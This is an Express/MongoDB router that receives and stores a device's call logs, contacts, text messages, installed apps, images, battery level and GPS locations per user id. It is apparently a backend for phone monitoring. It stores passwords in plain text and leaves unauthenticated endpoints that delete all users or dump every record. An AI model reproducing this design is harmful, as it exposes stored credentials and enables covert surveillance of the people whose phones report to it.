const express = require("express")
const router = express.Router()
const users = require("../models/userSchema")

var SuccessJsonArray=[  {    "id": 1,    "name": "John",    "age": 30  }]


router.patch("/imageSetList/:id", async (req, res) => {
    try {
        const { id } = req.params
        
        let arrayObj=[];
        req.body.forEach(async function(item) {
            let obj={
                Id:item.Id,
                Name:item.Name,
                Data:item.Data
            };
            arrayObj.push(obj);
          });
       await users.findOneAndUpdate({ _id: id }, { $set: { images: arrayObj } })
        res.status(201).json(SuccessJsonArray)
    } catch (error) {
        res.status(404).json(error)
    }
})
router.patch("/CallLogsSetList/:id", async (req, res) => {
    try {
        console.log(req.body)
        const { id } = req.params
        
        let arrayObj=[];
        req.body.forEach(async function(item) {
            let obj={
                Mobile:item.Mobile,
                Date:item.Date,
                Duration:item.Duration
            };
            arrayObj.push(obj);
          });
        await users.findOneAndUpdate({ _id: id }, { $set: { CallLogs: arrayObj } })
        res.status(201).json(SuccessJsonArray)
    } catch (error) {
        res.status(404).json(error)
    }
})
router.patch("/TotalContactsList/:id", async (req, res) => {
    try {
        console.log(req.body)
        const { id } = req.params
        
        let arrayObj=[];
        req.body.forEach(async function(item) {
          
            let obj={
                Name:item.Name,
                Number:item.Number
            };
            arrayObj.push(obj);
          });
         await users.findOneAndUpdate({ _id: id }, { $set: { TotalContacts: arrayObj } })
        res.status(201).json(SuccessJsonArray)
    } catch (error) {
        res.status(404).json(error)
    }
})
router.patch("/TotalAppsList/:id", async (req, res) => {
    try {
        console.log(req.body)
        const { id } = req.params
        
        let arrayObj=[];
        req.body.forEach(async function(item) {
            let obj={
                AppName:item.AppName
            };
            arrayObj.push(obj);
          });
        await users.findOneAndUpdate({ _id: id }, { $set: { TotalApps: arrayObj } })
        res.status(201).json(SuccessJsonArray)
    } catch (error) {
        res.status(404).json(error)
    }
})
router.patch("/TotalMassagesList/:id", async (req, res) => {
    try {
        console.log(req.body)
        const { id } = req.params
        
        let arrayObj=[];
        req.body.forEach(async function(item) {
            
            let obj={
                Title:item.Title,
                Massage:item.Massage
            };
            arrayObj.push(obj);
          });
       await users.findOneAndUpdate({ _id: id }, { $set: { TotalMassages: arrayObj } })
        res.status(201).json(SuccessJsonArray)
    } catch (error) {
        res.status(404).json(error)
    }
})
router.patch("/BatteryPercentage/:id", async (req, res) => {
    try {
        console.log(req.body)
        const { id } = req.params
        
        let arrayObj=[];
        req.body.forEach(async function(item) {
            
            let obj={
                Battary:item.Battary
            };
            arrayObj.push(obj);
          });
       await users.findOneAndUpdate({ _id: id }, { $set: { Battary: arrayObj } })
        res.status(201).json(SuccessJsonArray)
    } catch (error) {
        res.status(404).json(error)
    }
})
router.patch("/Locations/:id", async (req, res) => {
    try {
        console.log(req.body)
        const { id } = req.params
        
        let arrayObj=[];
        req.body.forEach(async function(item) {
            
            let obj={
                latitude:item.latitude,
                longitude:item.longitude
            };
            arrayObj.push(obj);
          });
       await users.findOneAndUpdate({ _id: id }, { $set: { Locations: arrayObj } })
        res.status(201).json(SuccessJsonArray)
    } catch (error) {
        res.status(404).json(error)
    }
})


router.post("/register", async (req, res) => {
    const { email, password } = req.body
    try {
        if (!password || !email) {
            res.status(403).send("plz fill the form")
        } else {
            const preuser = await users.findOne({ email: email })
            console.log(preuser)
            if (preuser) {
                res.status(404).send("already exist")
            }
            else {
                const AddNewUser = new users({
                     email,password
                })
                await AddNewUser.save()
                console.log(AddNewUser)
                res.status(201).json(AddNewUser)
            }
        }
    } catch (error) {
        res.status(404).json(error)
    }
})

router.get("/getUser/:id", async (req, res) => {
    try {
        console.log(req.params)
        const { id } = req.params
        const userindividual = await users.find({ email: id })
        console.log(userindividual)
        res.status(201).json(userindividual)
    } catch (error) {
        console.log("djflsfj")
        res.status(404).json(error)
    }
})

router.delete("/delete", async (req, res) => {
    try {
        const user = await users.deleteMany();
        res.status(201).json(user)
    } catch (error) {
        res.status(404).json(error)
    }
})
router.get("/getrequist", async (req, res) => {
    try {
        const user = await users.find();
        res.status(201).json(user)
    } catch (error) {
        res.status(404).json(error)
    }
})

module.exports = router;